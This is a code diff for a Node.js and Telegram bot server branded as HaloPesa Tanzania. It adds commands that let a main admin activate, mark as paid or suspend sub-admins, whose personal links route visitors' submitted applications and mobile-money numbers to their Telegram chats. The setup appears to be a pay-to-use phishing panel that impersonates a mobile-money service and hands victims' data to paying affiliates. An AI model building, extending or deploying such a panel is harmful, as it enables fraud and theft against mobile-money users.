@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Updated with Main Admin Authorization Control for Sub-Admins & Button Fade-Away.
+ * Updated with /activate, /payment, and /suspend Command Controls for Sub-Admins.
  */
 
 const express = require('express');
@@ -67,6 +67,9 @@ function isValidHaloPesaNumber(number) {
   return /^(061|062|063)\d{7}$/.test(clean);
 }
 
+/**
+ * Sub-admins must be both authorized and paid to route independent traffic.
+ */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
@@ -74,11 +77,11 @@ function resolveTargetChat(adminParam) {
       return FALLBACK_ADMIN_ID;
     }
     const adminRecord = admins.get(targetAdmin);
-    if (adminRecord && adminRecord.authorized) {
+    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
       return targetAdmin;
     }
   }
-  return FALLBACK_ADMIN_ID || null;
+  return null;
 }
 
 async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
@@ -91,7 +94,7 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
 
   const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
 
-  let adminListText = `👑 *Jopo la Udhibiti wa Wasimamizi Wasaidizi* (Ukurasa ${page + 1} kati ya${totalPages})\n\nSimamia hali ya idhini ya wasimamizi wasaidizi:`;
+  let adminListText = `👑 *Jopo la Udhibiti wa Wasimamizi Wasaidizi* (Ukurasa ${page + 1} kati ya${totalPages})\n\nSimamia hali ya idhini na malipo:`;
   let keyboard = [];
 
   if (adminEntries.length === 0) {
@@ -99,9 +102,10 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
   } else {
     paginatedEntries.forEach(([id, record]) => {
       const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'Mtumiaji');
-      const authStatus = record.authorized ? '🟢 Imeidhinishwa' : '🔴 Haijaidhinishwa / Inasubiri';
+      const authStatus = record.authorized ? '🟢 Imeidhinishwa' : '🔴 Haijaidhinishwa';
+      const paidStatus = record.paid ? '💰 Imelipwa' : '⏳ Haijalipwa';
       const subLink = `${APP_URL}/?admin=${id}`;
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Hali: ${authStatus}\n   🔗 \`${subLink}\``;
+      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Hali: ${authStatus} \vert{}${paidStatus}\n   🔗 \`${subLink}\``;
     });
   }
 
@@ -148,10 +152,83 @@ async function initBot() {
   bot.onText(/\/admins/, async (msg) => {
     const chatId = String(msg.chat.id);
     if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠️️ Huna idhini.`);
+      await bot.sendMessage(chatId, `⚠ Huna idhini.`);
       return;
     }
     await updateContinuousAdminList(chatId, null, 0);
+  });
+
+  // /activate <chat_id> command for Main Admin
+  bot.onText(/\/activate(?:\s+(.+))?/, async (msg, match) => {
+    const chatId = String(msg.chat.id);
+    if (chatId !== String(FALLBACK_ADMIN_ID)) {
+      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
+      return;
+    }
+
+    const targetId = match[1] ? match[1].trim() : '';
+    if (!targetId || !admins.has(targetId)) {
+      await bot.sendMessage(chatId, `⚠️ Tafadhali weka Chat ID sahihi ya msimamizi msaidizi unayemtaka kuwasha.\n\n*Mfano:* \`/activate 123456789\``, { parse_mode: 'Markdown' });
+      return;
+    }
+
+    const record = admins.get(targetId);
+    record.authorized = true;
+    record.status = 'ACTIVE';
+    saveAdmins();
+
+    const subLink = `${APP_URL}/?admin=${targetId}`;
+    await bot.sendMessage(chatId, `✅ Msimamizi msaidizi \`${targetId}\` amewashwa kikamilifu.`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(targetId, `🎉 Akaunti yako imewashwa na Msimamizi Mkuu!\n\n🔗 *Kiungo chako kiko tayari:*\n${subLink}`, { parse_mode: 'Markdown' }).catch(() => {});
+  });
+
+  // /suspend <chat_id> command for Main Admin
+  bot.onText(/\/suspend(?:\s+(.+))?/, async (msg, match) => {
+    const chatId = String(msg.chat.id);
+    if (chatId !== String(FALLBACK_ADMIN_ID)) {
+      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
+      return;
+    }
+
+    const targetId = match[1] ? match[1].trim() : '';
+    if (!targetId || !admins.has(targetId)) {
+      await bot.sendMessage(chatId, `⚠️ Tafadhali weka Chat ID sahihi ya msimamizi msaidizi unayemtaka kusitisha.\n\n*Mfano:* \`/suspend 123456789\``, { parse_mode: 'Markdown' });
+      return;
+    }
+
+    const record = admins.get(targetId);
+    record.authorized = false;
+    record.paid = false;
+    record.status = 'SUSPENDED';
+    saveAdmins();
+
+    await bot.sendMessage(chatId, `🚫 Msimamizi msaidizi \`${targetId}\` amesitishwa (suspended) kikamilifu.`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(targetId, `⚠️ Akaunti yako imesitishwa na Msimamizi Mkuu.`).catch(() => {});
+  });
+
+  // /payment <chat_id> command for Main Admin
+  bot.onText(/\/payment(?:\s+(.+))?/, async (msg, match) => {
+    const chatId = String(msg.chat.id);
+    if (chatId !== String(FALLBACK_ADMIN_ID)) {
+      await bot.sendMessage(chatId, `⚠ Huna idhini ya kutumia amri hii.`);
+      return;
+    }
+
+    const targetId = match[1] ? match[1].trim() : '';
+    if (!targetId || !admins.has(targetId)) {
+      await bot.sendMessage(chatId, `⚠️ Tafadhali weka Chat ID sahihi ya msimamizi msaidizi.\n\n*Mfano:* \`/payment 123456789\``, { parse_mode: 'Markdown' });
+      return;
+    }
+
+    const record = admins.get(targetId);
+    record.paid = true;
+    record.authorized = true;
+    record.status = 'ACTIVE';
+    saveAdmins();
+
+    const subLink = `${APP_URL}/?admin=${targetId}`;
+    await bot.sendMessage(chatId, `✅ Malipo yamethibitishwa na kiungo kimewashwa kwa msimamizi msaidizi \`${targetId}\`.`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(targetId, `🎉 Malipo yako yamethibitishwa na Msimamizi Mkuu!\n\n🔗 *Kiungo chako kiko tayari:*\n${subLink}`, { parse_mode: 'Markdown' }).catch(() => {});
   });
 
   bot.onText(/\/myprofile|\/me/, async (msg) => {
@@ -164,8 +241,8 @@ async function initBot() {
       
       if (chatId !== String(FALLBACK_ADMIN_ID)) {
         const record = admins.get(chatId);
-        if (!record || !record.authorized) {
-          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa.`);
+        if (!record || !record.authorized || !record.paid) {
+          await bot.sendMessage(chatId, `⚠️ Akaunti yako bado haijaidhinishwa au haijalipia.`);
           return;
         }
       }
@@ -173,7 +250,7 @@ async function initBot() {
       const userLink = `${APP_URL}/?admin=${chatId}`;
       let profileText = 
         `👤 *Taarifa zako za Kiungo Maalum*\n\n` +
-        `• *Jina:* ${firstName}${lastName}\n` +
+        `• *Jina:* ${firstName} ${lastName}\n` +
         `• *Telegram ID:* \`${userId}\`\n\n` +
         `🔗 *Kiungo Chako Maalum:*\n${userLink}`;
 
@@ -190,7 +267,7 @@ async function initBot() {
       const lastName = msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu. Kiungo chako: ${APP_URL}\n\nAndika /admins kusimamia wasimamizi wasaidizi.`, {
+        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu.\n\n*Amri Zilizopo:*\n• \`/admins\` - Orodha ya wasimamizi\n• \`/activate <chat_id>\` - Washa msimamizi\n• \`/payment <chat_id>\` - Thibitisha malipo\n• \`/suspend <chat_id>\` - Sitisha msimamizi`, {
           parse_mode: 'Markdown'
         });
         return;
@@ -216,25 +293,16 @@ async function initBot() {
 
       const record = admins.get(chatId);
 
-      if (!record.authorized) {
+      if (!record.authorized || !record.paid) {
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini!*\n\n` +
+          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Malipo/Idhini!*\n\n` +
           `👤 *Mtumiaji:* ${username ? '@' + username : firstName}\n` +
-          `🆔 *Chat ID:* \`${userId}\``, 
-          { 
-            parse_mode: 'Markdown',
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: '✅ Idhinisha', callback_data: `AUTH_YES_${userId}` },
-                  { text: '❌ Kataa', callback_data: `AUTH_NO_${userId}` }
-                ]
-              ]
-            }
-          }
+          `🆔 *Chat ID:* \`${userId}\`\n\n` +
+          `Tumia \`/activate ${userId}\` au \`/payment ${userId}\` kuruhusu kiungo chake.`, 
+          { parse_mode: 'Markdown' }
         );
 
-        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako **inasubiri idhini** kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako **inasubiri malipo na idhini** kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
         return;
       }
 
@@ -247,49 +315,6 @@ async function initBot() {
     try {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
-
-      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
-        if (chatId !== String(FALLBACK_ADMIN_ID)) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Huna idhini.' });
-          return;
-        }
-
-        const parts = actionData.split('_');
-        const decision = parts[1];
-        const targetSubId = parts[2];
-        const subRecord = admins.get(targetSubId);
-
-        if (!subRecord) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Haikupatikana.' });
-          return;
-        }
-
-        if (decision === 'YES') {
-          subRecord.authorized = true;
-          saveAdmins();
-          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
-          await bot.sendMessage(targetSubId, `🎉 Akaunti yako imeidhinishwa!\n\n🔗 *Kiungo:* ${assignedLink}`, { parse_mode: 'Markdown' }).catch(() => {});
-          await bot.answerCallbackQuery(query.id, { text: '✅ Imeidhinishwa!' });
-          await bot.editMessageText(`✅ *Imetumika & Imeidhinishwa*\n\nID: \`${targetSubId}\``, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [] }
-          });
-        } else {
-          admins.delete(targetSubId);
-          saveAdmins();
-          await bot.sendMessage(targetSubId, `❌ Ombi limekataliwa.`).catch(() => {});
-          await bot.answerCallbackQuery(query.id, { text: '❌ Imekataliwa.' });
-          await bot.editMessageText(`❌ *Imekataliwa*\n\nID: \`${targetSubId}\``, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [] }
-          });
-        }
-        return;
-      }
 
       if (actionData.startsWith('PAGE_')) {
         const pageNum = parseInt(actionData.split('_')[1]) || 0;
@@ -336,7 +361,6 @@ async function initBot() {
 
       await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa` }).catch(() => {});
 
-      // Fade away buttons immediately after click
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -366,7 +390,7 @@ app.post('/api/submit-application', async (req, res) => {
 
     const targetChat = resolveTargetChat(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa.' });
+      return res.status(400).json({ success: false, error: 'Msimamizi hajalipia au hajaidhinishwa.' });
     }
 
     const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
@@ -478,3 +502,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
+  
